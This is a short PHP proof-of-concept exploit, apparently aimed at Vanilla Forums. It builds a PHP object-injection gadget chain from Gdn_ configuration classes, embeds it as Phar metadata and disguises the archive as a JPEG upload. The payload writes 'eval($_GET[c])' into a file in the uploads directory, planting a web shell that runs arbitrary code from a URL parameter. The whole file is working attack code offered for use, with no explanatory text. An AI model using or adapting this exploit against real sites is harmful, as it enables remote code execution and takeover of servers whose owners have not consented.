<?php
// custom pop chain
class Gdn_ConfigurationSource{
    public function __construct(){
        $this->Type = "file";
        $this->Source = "/var/www/html/uploads/output2";
        $this->Group = 'a=eval($_GET[c]);//';
        $this->Settings[""] = "";       
        $this->Dirty = true;
        $this->ClassName = "Gdn_ConfigurationSource";
    }
}
class Gdn_Configuration {
    public $sources = [];
    public function __construct(){
        $this->sources['si'] = new Gdn_ConfigurationSource();
    }
}

// create new Phar
$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// add our object as meta data
$phar->setMetadata(new Gdn_Configuration());
$phar->stopBuffering();

// we rename it now
rename("poc.phar", "poc.jpg");
